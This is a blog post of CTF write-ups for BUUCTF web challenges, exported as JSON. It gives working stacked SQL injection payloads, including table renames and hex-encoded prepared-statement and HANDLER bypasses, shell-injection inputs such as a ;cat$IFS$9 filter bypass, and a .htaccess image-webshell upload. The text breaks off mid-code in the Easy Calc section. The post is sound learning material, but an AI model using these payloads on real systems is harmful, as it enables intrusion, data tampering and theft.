{"title":"buuctf靶场wp","uid":"d85793a4128cf3cc353119248e4d44d8","slug":"wp-buuctf","date":"2022-06-21T14:06:24.391Z","updated":"2023-08-06T08:01:10.360Z","comments":true,"path":"api/articles/wp-buuctf.json","keywords":null,"cover":"/img/32.jpg","content":"<p><code>web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"1-强网杯-2019-随便注\"><a href=\"#1-强网杯-2019-随便注\" class=\"headerlink\" title=\"1.[强网杯 2019]随便注\"></a>1.[强网杯 2019]随便注</h2><h3 id=\"1）题目描述\"><a href=\"#1）题目描述\" class=\"headerlink\" title=\"1）题目描述\"></a>1）题目描述</h3><p>无</p>\n<h3 id=\"2）wp\"><a href=\"#2）wp\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>因为之前没有了解过堆叠注入，这里挨个分析学习</p>\n<p>先来确定sql注入</p>\n<pre><code>1&#39;\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220701113045499.png\" alt=\"image-20220701113045499\"></p>\n<p>然后试试显示所有数据，感觉看不到什么意思，后面一步步分析</p>\n<pre><code>1&#39; or 1=1;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220702105520465.png\" alt=\"image-20220702105520465\"></p>\n<p>然后判断字段</p>\n<p><img src=\"/post/wp-buuctf/image-20220701113210998.png\" alt=\"image-20220701113210998\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113228972.png\" alt=\"image-20220701113228972\"></p>\n<p>判断处字段数为2</p>\n<p>然后用<strong>联合注入</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113604165.png\" alt=\"image-20220701113604165\"></p>\n<p>发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法</p>\n<p>可以先了解<a href=\"../../../../2022/05/28/Web-study\">堆叠注入</a>的概念和注入方式</p>\n<h4 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a><strong>堆叠注入</strong></h4><p>先查看所有的数据库</p>\n<p><code>注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句</code></p>\n<p><code>;间隔sql语句</code></p>\n<pre><code>-1&#39;;show databases;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220701224154901.png\" alt=\"image-20220701224154901\"></p>\n<p>根据题目名字，先调用supersqli这个库的表看看</p>\n<pre><code>-1&#39;;use supersqli;show tables;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220701222551203.png\" alt=\"image-20220701222551203\"></p>\n<p>看到有两个表，先看一下纯数字的表里的内容</p>\n<p> <strong><u>注：当纯数字字符串是表名的时候需要加反引号&#96;</u></strong></p>\n<pre><code>-1&#39;;use supersqli;show columns from`1919810931114514`;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220701224603433.png\" alt=\"image-20220701224603433\"></p>\n<p>看到flag在里面，再看看words里</p>\n<pre><code>-1&#39;;use supersqli;show columns from words;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220701233450179.png\" alt=\"image-20220701233450179\"></p>\n<p><code>VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串</code></p>\n<p>这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表</p>\n<p>后台sql语句可能（xx为输入框的内容）</p>\n<p><code>select id,data from words where id=xx</code></p>\n<hr>\n<p>更改表名列名</p>\n<p>1，通过 rename 先把 words 表改名为其他的表名。</p>\n<p>2，把 1919810931114514 表的名字改为 words 。</p>\n<p>3 ，将修改后的 words 表中flag列名改成列名 id ，这样只需进行正常查询就会按上面猜测后台sql语句一样显示出flag</p>\n<pre><code>-1&#39;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#\n</code></pre>\n<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220112706.png\" alt=\"image-20220702220112706\"></p>\n<p>可以看到表<code>1919810931114514</code>名字被改成了可查询表<code>words</code></p>\n<p>再看看words表的列，flag变成了id，NO变成了YES</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220308651.png\" alt=\"image-20220702220308651\"></p>\n<p>因为flag为id了，用<code>1&#39; or 1=1;#</code>恒真测试使其回显</p>\n<p>看看回显数据</p>\n<p><img src=\"/post/wp-buuctf/image-20220702221617795.png\" alt=\"image-20220702221617795\"></p>\n<p>得到flag</p>\n<pre><code>SQl的rename\n用于重命名表名\n\n\nSQL的alter用法总结\n\n1：删除列\n\nALTER TABLE 表名 DROP COLUMN 列名\n\n2：增加列\n\nALTER TABLE 表名 ADD COLUMN 列名 属性 【约束】\n\n3：修改列的类型信息\n\nALTER TABLE 表名 CHANGE COLUMN 列名 【新】列名\n新属性\n4：重命名列\n\nALTER TABLE 表名字 CHANGE COLUMN 列名 新列名 属性\n\n5：重命名表\n\nALTER TABLE 表名 RENAME TO 表新名\n\n6：删除表中主键\n\nAlter TABLE 表名 DROP primary key\n\n7：添加主键\n\nALTER TABLE 表名 ADD CONSTRAINT 约束名 PRIMARY KEY (添加列)\n\n8：添加索引\n\nALTER TABLE 表名 ADD index 索引名 (列名);\n\n9：修改列的属性\nALTER TABLE 表名 MODIFY COLUMN 要修改属性的列名 新属性;\n\n一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。\n</code></pre>\n<p>–</p>\n<p>看了其他大佬的wp，这里补充两种方法</p>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/103239145\">原文链接</a></p>\n<h4 id=\"解题思路2：预处理绕过select限制\"><a href=\"#解题思路2：预处理绕过select限制\" class=\"headerlink\" title=\"解题思路2：预处理绕过select限制\"></a><strong>解题思路2：<a href=\"https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020\">预处理</a>绕过select限制</strong></h4><p>因为select被过滤了，所以先将</p>\n<pre><code>select * from ` 1919810931114514 `\n</code></pre>\n<p>进行16进制编码</p>\n<p>再通过构造payload得</p>\n<pre><code>;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#\n</code></pre>\n<p>进而得到flag</p>\n<pre><code>prepare…from…是预处理语句，会进行编码转换。\nexecute用来执行由SQLPrepare创建的SQL语句。\nSELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20230503173612612.png\" alt=\"image-20230503173612612\"></p>\n<h4 id=\"解题思路3：handler绕过\"><a href=\"#解题思路3：handler绕过\" class=\"headerlink\" title=\"解题思路3：handler绕过\"></a><strong>解题思路3：<a href=\"https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020\">handler</a>绕过</strong></h4><p>payload：</p>\n<pre><code>1&#39;; handler `1919810931114514` open as `a`; handler `a` read next;#\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20230503173624567.png\" alt=\"image-20230503173624567\"></p>\n<h5 id=\"handler基本用法\"><a href=\"#handler基本用法\" class=\"headerlink\" title=\"handler基本用法\"></a>handler基本用法</h5><pre><code>HANDLER tbl_name OPEN [ [AS] alias]\n\nHANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ &#123; FIRST | NEXT &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\n    \nHANDLER tbl_name CLOSE\n\n通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。\n通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。\n通过HANDLER tbl_name CLOSE来关闭打开的句柄。\n\n通过索引去查看的话可以按照一定的顺序，获取表中的数据。\n通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。\n\n通过索引列指定一个值，可以指定从哪一行开始。\n通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。\n</code></pre>\n<p><u><code>句柄：【相当于一个指针，这里是指向数据库里的表】</code></u></p>\n<h5 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h5><pre><code>3.1 创建测试表及测试数据\n\ncreate table handler_table(  \n    c1 int,   \n    c2 varchar(10),   \n    c3 int(10) \n);  \ninsert into handler_table values(2, &#39;name2&#39;, 002);  \ninsert into handler_table values(5, &#39;name5&#39;, 005);  \ninsert into handler_table values(1, &#39;name1&#39;, 001);  \ninsert into handler_table values(4, &#39;name4&#39;, 004);  \ninsert into handler_table values(3, &#39;name3&#39;, 003);\n\n3.2 不通过索引打开查看表\n\n打开句柄：【相当于一个指针】\n\nmysql&gt; handler handler_table open;\n\n查看表数据：\n\nmysql&gt; handler handler_table read first;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql&gt; handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql&gt; handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    1 | name1 |    1 |\n+------+-------+------+\nmysql&gt; handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql&gt; handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql&gt; handler handler_table read next;\nEmpty set (0.00 sec)\n\n\n关闭句柄：\n\nmysql&gt; handler handler_table close;\nQuery OK, 0 rows affected (0.00 sec)\n\n3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）\n通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。\n\n创建索引：\n\nmysql&gt; create index handler_index on handler_table(c1);\n\n打开句柄：\n\nmysql&gt; handler handler_table open as p;\n\n查看表数据：\n\nmysql&gt; handler p read handler_index first;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    1 | name1 |    1 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql&gt; handler p read handler_index prev;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql&gt; handler p read handler_index last;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\n\n\n\n关闭句柄：\n\nmysql&gt; handler p close;\n\n3.4 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;）\n从index为2的地方开始\n\n打开句柄：\n\nmysql&gt; handler handler_table open as p;\n\n查看表数据：\n\nmysql&gt; handler p read handler_index = (2);\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;     \n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql&gt; handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql&gt; handler p read handler_index last;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\n\n关闭句柄：\n\nmysql&gt; handler p close;\n\n3.5 附加：语法实例参考\n\nhandler handler_table open;\nhandler handler_table open as p;\nhandler handler_table read first;\nhandler handler_table read next;\nhandler handler_table read first limit 3;\nhandler handler_table read next limit 3,3;\nhandler handler_table read first where c1 &gt; 2 limit 2;\nhandler handler_table read next where c1 &gt;2 limit 1,2;\n \ncreate index handler_index on handler_table(c1);\nhandler handler_table open;\nhandler handler_table read handler_index first;\nhandler handler_table read handler_index next limit 3;\nhandler handler_table read handler_index PREV limit 3,3;\nhandler handler_table read handler_index LAST where c1 &gt; 2 limit 2;\nhandler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;\nhandler handler_table read handler_index = (3);\nhandler handler_table read handler_index &lt;= (3) limit 2;\nhandler handler_table read handler_index &gt;= (3) limit 1,2;\nhandler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;\nhandler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;\nhandler handler_table close;\ndrop index handler_index on handler_table;\n</code></pre>\n<p>这里看懂以后，我自己又重新构造了一个</p>\n<pre><code>1&#39;; handler `1919810931114514` open;handler `1919810931114514` read first;\n</code></pre>\n<p>效果一样，意思也差不多</p>\n<p><img src=\"/post/wp-buuctf/image-20220731224702281.png\" alt=\"image-20220731224702281\"></p>\n<h2 id=\"2-GXYCTF2019-Ping-Ping-Ping\"><a href=\"#2-GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"2.[GXYCTF2019]Ping Ping Ping\"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id=\"1-题目描述\"><a href=\"#1-题目描述\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp\"><a href=\"#2-wp\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看名字应该是道命令执行的题目</p>\n<p>先传一个IP:123.123.123.123试试</p>\n<p><code>?ip=123.123.123.123</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706231831194.png\" alt=\"image-20220706231831194\"></p>\n<p>看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）</p>\n<p><code>?ip=123.123.123.123;ls</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706232001574.png\" alt=\"image-20220706232001574\"></p>\n<p>看到flag文件，看看能不能直接读出</p>\n<p><img src=\"/post/wp-buuctf/image-20220706232135596.png\" alt=\"image-20220706232135596\"></p>\n<p>发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是</p>\n<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706233818795.png\" alt=\"image-20220706233818795\"></p>\n<p>意思是符号都过滤了</p>\n<p>这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤</p>\n<p>$IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>\n<p>试试</p>\n<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706234926216.png\" alt=\"image-20220706234926216\"></p>\n<p>发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码</p>\n<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>pre</span><span class=\"token punctuation\">></span></span></span><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{;00};-\\x{;1f};]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{;|\\};/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{;00};-\\x{;20};]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{;|\\};/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ping -c 4 \"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;pre>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter\">?></span>\n</code></pre>\n<p>看到ip有很多正则匹配的字符，所以没有那么容易绕过</p>\n<pre><code>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。\nshell_exec(string $cmd): string\nexec 是 Shell 内置命令，它有两种用法，一种是执行 Shell 命令，一种是操作文件描述符\nping -c Count 指定要被发送（或接收）的回送信号请求的数目，由 Count 变量指出\n--(所以这里我们只能输入四个字符)--\n</code></pre>\n<pre><code>print_r函数用于打印变量，以更容易理解的形式展示\n\n例子\n&lt;?php \n$a = array (&#39;a&#39; =&gt; &#39;apple&#39;, &#39;b&#39; =&gt; &#39;banana&#39;, &#39;c&#39; =&gt; array (&#39;x&#39;,&#39;y&#39;,&#39;z&#39;)); \nprint_r ($a); \n?&gt;\n输出结果\nArray\n(\n    [a] =&gt; apple\n    [b] =&gt; banana\n    [c] =&gt; Array\n        (\n            [0] =&gt; x\n            [1] =&gt; y\n            [2] =&gt; z\n        )\n\n)\n</code></pre>\n<p>flag过滤语句的意思判断是否按顺序出现flag</p>\n<pre><code>else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))\n</code></pre>\n<p>所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示</p>\n<p>我们看源码知道有两个变量，一个是$ip,$a</p>\n<p>ip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a&#x3D;flag，就会顺序出现flag，匹配，所以试试a&#x3D;g，flag–&gt;fla$a</p>\n<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>\n<p>查看源码</p>\n<p>得到flag</p>\n<h2 id=\"3-MRCTF2020-你传你🐎呢\"><a href=\"#3-MRCTF2020-你传你🐎呢\" class=\"headerlink\" title=\"3.[MRCTF2020]你传你🐎呢\"></a>3.[MRCTF2020]你传你🐎呢</h2><h3 id=\"1-题目描述-1\"><a href=\"#1-题目描述-1\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-1\"><a href=\"#2-wp-1\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p> 看标题知道这是一个文件上传的题目，要求上传一个木马</p>\n<p><img src=\"/post/wp-buuctf/image-20220710111959632.png\" alt=\"image-20220710111959632\"></p>\n<p>打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp<a href=\"https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020\">抓包</a>，修改上传的PHP的content-type为image&#x2F;png，但是还是一样的</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）</p>\n<p>但是上传时，又被过滤了</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114410888.png\" alt=\"image-20220710114410888\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114422488.png\" alt=\"image-20220710114422488\"></p>\n<p>然后上传图片木马</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114444539.png\" alt=\"image-20220710114444539\"></p>\n<p>把路径复制一下</p>\n<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114617412.png\" alt=\"image-20220710114617412\"></p>\n<p>蚁剑连接成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114647722.png\" alt=\"image-20220710114647722\"></p>\n<p>在根目录发现flag</p>\n<p>得到flag</p>\n<h2 id=\"4-RoarCTF-2019-Easy-Calc\"><a href=\"#4-RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"4.[RoarCTF 2019]Easy Calc\"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id=\"1-题目描述-2\"><a href=\"#1-题目描述-2\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-2\"><a href=\"#2-wp-2\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>还是得看大佬得wp才会</p>\n<p><a href=\"https://blog.csdn.net/weixin_44077544/article/details/102630714\">原文链接</a></p>\n<p>这是calc.php的内容，查看源码就可以看到</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\['</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\]'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\$'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\^'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token punctuation\">.</span> <span class=\"token string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"what are you want to do?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">'echo '</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">.</span><span class=\"token 